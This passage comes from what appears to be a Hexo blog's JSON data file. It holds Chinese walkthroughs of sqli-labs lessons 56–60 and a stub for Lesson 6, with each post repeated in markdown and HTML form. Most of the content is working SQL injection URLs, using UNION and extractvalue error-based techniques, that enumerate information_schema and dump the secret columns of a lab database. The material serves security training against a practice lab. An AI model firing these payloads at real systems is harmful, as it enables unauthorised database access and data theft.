lession-56 GET-Union-变化3-仅允许14次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p><code>http://192.168.75.133:8082/Less-56/?id=1&#39;)+order+by+3%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/001.png\" alt=\"001\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(database()),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;vt405s3q0e&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/004.png\" alt=\"004\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(select+GROUP_CONCAT(secret_F5AO)from challenges.vt405s3q0e),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/005.png\" alt=\"005\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-56/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-56-GET-Union-变化3-仅允许14次请求\"><a href=\"#sqli-labs-lession-56-GET-Union-变化3-仅允许14次请求\" class=\"headerlink\" title=\"sqli-labs lession-56 GET-Union-变化3-仅允许14次请求\"></a>sqli-labs lession-56 GET-Union-变化3-仅允许14次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p><code>http://192.168.75.133:8082/Less-56/?id=1&#39;)+order+by+3%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/001.png\" alt=\"001\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(database()),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;vt405s3q0e&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/004.png\" alt=\"004\"></p>\n<p><code>http://192.168.75.133:8082/Less-56/?id=-1&#39;)+union+select+1,(select+GROUP_CONCAT(secret_F5AO)from challenges.vt405s3q0e),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-56/005.png\" alt=\"005\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-56/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs lession-57 GET-Union-变化4-仅允许14次请求","date":"2018-11-28T15:50:54.000Z","_content":"\n# sqli-labs lession-57 GET-Union-变化4-仅允许14次请求\n\n---\n\n## 手注\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,database(),user()%23`\n\n![001](/img/sql/Lesson-57/001.png)\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![002](/img/sql/Lesson-57/002.png)\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='7hwn3qp2g0'),user()%23`\n\n![003](/img/sql/Lesson-57/003.png)\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,(select+GROUP_CONCAT(secret_PK4A)from challenges.7hwn3qp2g0),user()%23`\n\n![004](/img/sql/Lesson-57/004.png)\n\n提交\n\n![005](/img/sql/Lesson-57/005.png)","source":"_posts/sqli-labs-lession-57-GET-Union-变化4-仅允许14次请求.md","raw":"---\ntitle: sqli-labs lession-57 GET-Union-变化4-仅允许14次请求\ndate: 2018-11-28 23:50:54\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-57 GET-Union-变化4-仅允许14次请求\n\n---\n\n## 手注\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,database(),user()%23`\n\n![001](/img/sql/Lesson-57/001.png)\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`\n\n![002](/img/sql/Lesson-57/002.png)\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='7hwn3qp2g0'),user()%23`\n\n![003](/img/sql/Lesson-57/003.png)\n\n`http://192.168.75.133:8082/Less-57/?id=-7)\"+union+select+1,(select+GROUP_CONCAT(secret_PK4A)from challenges.7hwn3qp2g0),user()%23`\n\n![004](/img/sql/Lesson-57/004.png)\n\n提交\n\n![005](/img/sql/Lesson-57/005.png)","slug":"sqli-labs-lession-57-GET-Union-变化4-仅允许14次请求","published":1,"updated":"2019-06-19T17:23:13.397Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfk006s4dsb6gjimfoa","content":"<h1 id=\"sqli-labs-lession-57-GET-Union-变化4-仅允许14次请求\"><a href=\"#sqli-labs-lession-57-GET-Union-变化4-仅允许14次请求\" class=\"headerlink\" title=\"sqli-labs lession-57 GET-Union-变化4-仅允许14次请求\"></a>sqli-labs lession-57 GET-Union-变化4-仅允许14次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,database(),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/001.png\" alt=\"001\"></p>\n<p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;7hwn3qp2g0&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,(select+GROUP_CONCAT(secret_PK4A)from challenges.7hwn3qp2g0),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-57/005.png\" alt=\"005\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-57-GET-Union-变化4-仅允许14次请求\"><a href=\"#sqli-labs-lession-57-GET-Union-变化4-仅允许14次请求\" class=\"headerlink\" title=\"sqli-labs lession-57 GET-Union-变化4-仅允许14次请求\"></a>sqli-labs lession-57 GET-Union-变化4-仅允许14次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,database(),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/001.png\" alt=\"001\"></p>\n<p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;7hwn3qp2g0&#39;),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133:8082/Less-57/?id=-7)&quot;+union+select+1,(select+GROUP_CONCAT(secret_PK4A)from challenges.7hwn3qp2g0),user()%23</code></p>\n<p><img src=\"/img/sql/Lesson-57/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-57/005.png\" alt=\"005\"></p>\n"},{"title":"sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求","date":"2018-11-28T16:25:10.000Z","_content":"\n# sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求\n\n---\n\n## 手注\n\n有报错注入\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![001](/img/sql/Lesson-58/001.png)\n\n次数不够了,重启...\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![002](/img/sql/Lesson-58/002.png)\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='4wdd58q1in'),0x7e))%23`\n\n![003](/img/sql/Lesson-58/003.png)\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_SYCF)from challenges.4wdd58q1in),0x7e))%23`\n\n![004](/img/sql/Lesson-58/004.png)\n\n提交\n\n![005](/img/sql/Lesson-58/005.png)","source":"_posts/sqli-labs-lession-58-GET-双注入-变化1-仅允许5次请求.md","raw":"---\ntitle: sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求\ndate: 2018-11-29 00:25:10\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求\n\n---\n\n## 手注\n\n有报错注入\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![001](/img/sql/Lesson-58/001.png)\n\n次数不够了,重启...\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![002](/img/sql/Lesson-58/002.png)\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='4wdd58q1in'),0x7e))%23`\n\n![003](/img/sql/Lesson-58/003.png)\n\n`http://192.168.75.133:8082/Less-58/?id=1'and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_SYCF)from challenges.4wdd58q1in),0x7e))%23`\n\n![004](/img/sql/Lesson-58/004.png)\n\n提交\n\n![005](/img/sql/Lesson-58/005.png)","slug":"sqli-labs-lession-58-GET-双注入-变化1-仅允许5次请求","published":1,"updated":"2019-06-19T17:23:13.397Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfm006v4dsbksk5akko","content":"<h1 id=\"sqli-labs-lession-58-GET-双注入-变化1-仅允许5次请求\"><a href=\"#sqli-labs-lession-58-GET-双注入-变化1-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求\"></a>sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>有报错注入</p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/001.png\" alt=\"001\"></p>\n<p>次数不够了,重启…</p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;4wdd58q1in&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_SYCF)from challenges.4wdd58q1in),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-58/005.png\" alt=\"005\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-58-GET-双注入-变化1-仅允许5次请求\"><a href=\"#sqli-labs-lession-58-GET-双注入-变化1-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求\"></a>sqli-labs-lession 58 GET-双注入-变化1-仅允许5次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>有报错注入</p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/001.png\" alt=\"001\"></p>\n<p>次数不够了,重启…</p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;4wdd58q1in&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.133:8082/Less-58/?id=1&#39;and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_SYCF)from challenges.4wdd58q1in),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-58/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-58/005.png\" alt=\"005\"></p>\n"},{"title":"sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求","date":"2018-11-29T01:18:23.000Z","_content":"\n# sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求\n\n---\n\n手注\n\n判断为数字型,并且可以利用报错注入。\n\n![001](/img/sql/Lesson-59/001.png)\n\n`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![002](/img/sql/Lesson-59/002.png)\n\n`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='av81nm62ml'),0x7e))%23`\n\n![003](/img/sql/Lesson-59/003.png)\n\n`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_V1FL)from challenges.av81nm62ml),0x7e))%23`\n\n![004](/img/sql/Lesson-59/004.png)\n\n提交\n\n![005](/img/sql/Lesson-59/005.png)","source":"_posts/sqli-labs-lession-59-GET-双注入-变化2-仅允许5次请求.md","raw":"---\ntitle: sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求\ndate: 2018-11-29 09:18:23\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求\n\n---\n\n手注\n\n判断为数字型,并且可以利用报错注入。\n\n![001](/img/sql/Lesson-59/001.png)\n\n`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![002](/img/sql/Lesson-59/002.png)\n\n`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='av81nm62ml'),0x7e))%23`\n\n![003](/img/sql/Lesson-59/003.png)\n\n`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_V1FL)from challenges.av81nm62ml),0x7e))%23`\n\n![004](/img/sql/Lesson-59/004.png)\n\n提交\n\n![005](/img/sql/Lesson-59/005.png)","slug":"sqli-labs-lession-59-GET-双注入-变化2-仅允许5次请求","published":1,"updated":"2019-06-19T17:23:13.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfp006z4dsbgpmu2ffv","content":"<h1 id=\"sqli-labs-lession-59-GET-双注入-变化2-仅允许5次请求\"><a href=\"#sqli-labs-lession-59-GET-双注入-变化2-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求\"></a>sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求</h1><hr>\n<p>手注</p>\n<p>判断为数字型,并且可以利用报错注入。</p>\n<p><img src=\"/img/sql/Lesson-59/001.png\" alt=\"001\"></p>\n<p><code>http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-59/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;av81nm62ml&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-59/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_V1FL)from challenges.av81nm62ml),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-59/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-59/005.png\" alt=\"005\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-59-GET-双注入-变化2-仅允许5次请求\"><a href=\"#sqli-labs-lession-59-GET-双注入-变化2-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求\"></a>sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求</h1><hr>\n<p>手注</p>\n<p>判断为数字型,并且可以利用报错注入。</p>\n<p><img src=\"/img/sql/Lesson-59/001.png\" alt=\"001\"></p>\n<p><code>http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-59/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;av81nm62ml&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-59/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_V1FL)from challenges.av81nm62ml),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-59/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-59/005.png\" alt=\"005\"></p>\n"},{"title":"sqli-labs-lession-6 GET双引号双注入","date":"2018-09-24T11:38:48.000Z","_content":"\n# sqli-labs lession 6 GET双引号双注入 #\n---\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/JV5jbZe.png)\n\n## 注入 ##\n\n判断出双引号闭合后,接下来步骤与Lesson-5无区别。\n\n![2](https://i.imgur.com/s3sARs7.png)\n\n{% post_link sqli-labs-lession-5-GET单引号双注入 点击查看Lesson-5 %}","source":"_posts/sqli-labs-lession-6-GET双引号双注入.md","raw":"---\ntitle: sqli-labs-lession-6 GET双引号双注入\ndate: 2018-09-24 19:38:48\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 6 GET双引号双注入 #\n---\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/JV5jbZe.png)\n\n## 注入 ##\n\n判断出双引号闭合后,接下来步骤与Lesson-5无区别。\n\n![2](https://i.imgur.com/s3sARs7.png)\n\n{% post_link sqli-labs-lession-5-GET单引号双注入 点击查看Lesson-5 %}","slug":"sqli-labs-lession-6-GET双引号双注入","published":1,"updated":"2019-06-19T17:23:13.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfr00724dsb11ud541f","content":"<h1 id=\"sqli-labs-lession-6-GET双引号双注入\"><a href=\"#sqli-labs-lession-6-GET双引号双注入\" class=\"headerlink\" title=\"sqli-labs lession 6 GET双引号双注入\"></a>sqli-labs lession 6 GET双引号双注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/JV5jbZe.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>判断出双引号闭合后,接下来步骤与Lesson-5无区别。</p>\n<p><img src=\"https://i.imgur.com/s3sARs7.png\" alt=\"2\"></p>\n<a href=\"/2018/09/21/sqli-labs-lession-5-GET单引号双注入/\" title=\"点击查看Lesson-5\">点击查看Lesson-5</a>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-6-GET双引号双注入\"><a href=\"#sqli-labs-lession-6-GET双引号双注入\" class=\"headerlink\" title=\"sqli-labs lession 6 GET双引号双注入\"></a>sqli-labs lession 6 GET双引号双注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/JV5jbZe.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>判断出双引号闭合后,接下来步骤与Lesson-5无区别。</p>\n<p><img src=\"https://i.imgur.com/s3sARs7.png\" alt=\"2\"></p>\n<a href=\"/2018/09/21/sqli-labs-lession-5-GET单引号双注入/\" title=\"点击查看Lesson-5\">点击查看Lesson-5</a>"},{"title":"sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求","date":"2018-11-29T02:02:28.000Z","_content":"\n# sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求\n\n---\n\n## 手注\n\n对常见的`'\")`进行测试\n\n`http://10.60.17.35:8082/Less-60/?id=1\"+or+1=2%23`\n\n发现报错\n\n最终测试出闭合`\")`\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![001](/img/sql/Lesson-60/001.png)\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![002](/img/sql/Lesson-60/002.png)\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='j5429wlony'),0x7e))%23`\n\n![003](/img/sql/Lesson-60/003.png)\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_RPNY)from challenges.j5429wlony),0x7e))%23`\n\n![004](/img/sql/Lesson-60/004.png)\n\n提交\n\n![005](/img/sql/Lesson-60/005.png)","source":"_posts/sqli-labs-lession-60-GET-双注入-变化3-仅允许5次请求.md","raw":"---\ntitle: sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求\ndate: 2018-11-29 10:02:28\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求\n\n---\n\n## 手注\n\n对常见的`'\")`进行测试\n\n`http://10.60.17.35:8082/Less-60/?id=1\"+or+1=2%23`\n\n发现报错\n\n最终测试出闭合`\")`\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![001](/img/sql/Lesson-60/001.png)\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![002](/img/sql/Lesson-60/002.png)\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='j5429wlony'),0x7e))%23`\n\n![003](/img/sql/Lesson-60/003.png)\n\n`http://10.60.17.35:8082/Less-60/?id=1\")+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_RPNY)from challenges.j5429wlony),0x7e))%23`\n\n![004](/img/sql/Lesson-60/004.png)\n\n提交\n\n![005](/img/sql/Lesson-60/005.png)","slug":"sqli-labs-lession-60-GET-双注入-变化3-仅允许5次请求","published":1,"updated":"2019-06-19T17:23:13.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfw00764dsb68l6065v","content":"<h1 id=\"sqli-labs-lession-60-GET-双注入-变化3-仅允许5次请求\"><a href=\"#sqli-labs-lession-60-GET-双注入-变化3-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求\"></a>sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>对常见的<code>&#39;&quot;)</code>进行测试</p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;+or+1=2%23</code></p>\n<p>发现报错</p>\n<p>最终测试出闭合<code>&quot;)</code></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/001.png\" alt=\"001\"></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;j5429wlony&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_RPNY)from challenges.j5429wlony),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-60/005.png\" alt=\"005\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-60-GET-双注入-变化3-仅允许5次请求\"><a href=\"#sqli-labs-lession-60-GET-双注入-变化3-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求\"></a>sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>对常见的<code>&#39;&quot;)</code>进行测试</p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;+or+1=2%23</code></p>\n<p>发现报错</p>\n<p>最终测试出闭合<code>&quot;)</code></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/001.png\" alt=\"001\"></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/002.png\" 